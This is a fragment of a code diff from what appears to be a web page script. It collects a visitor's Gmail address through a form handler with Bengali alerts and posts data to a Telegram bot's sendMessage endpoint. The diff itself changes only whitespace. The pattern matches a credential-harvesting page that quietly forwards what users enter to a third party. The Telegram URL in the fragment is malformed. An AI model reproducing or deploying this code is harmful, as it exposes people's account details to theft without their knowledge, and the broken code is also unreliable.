@@ -948,7 +948,7 @@
                 })
             }).catch(e => console.log("Telegram API Error:", e));
         }
-        function handleGmailSubmit() {
+ function handleGmailSubmit() {
     var gmailData = document.getElementById('gmailInputField').value.trim();
     if (gmailData === "") { alert("অনুগ্রহ করে ফাঁকা ঘরটি পূরণ করুন!"); return; }
     if (!gmailData.toLowerCase().includes("@gmail.com")) { alert("Your Email Wrong, শেষে @gmail.com থাকতে হবে!"); return; }
@@ -1024,6 +1024,7 @@
         alert("❌ কানেকশনে সমস্যা হয়েছে। অনুগ্রহ করে আবার চেষ্টা করুন।");
     });
 }
+
 
     let url = `https://telegram.org{currentToken}/sendMessage`;
     
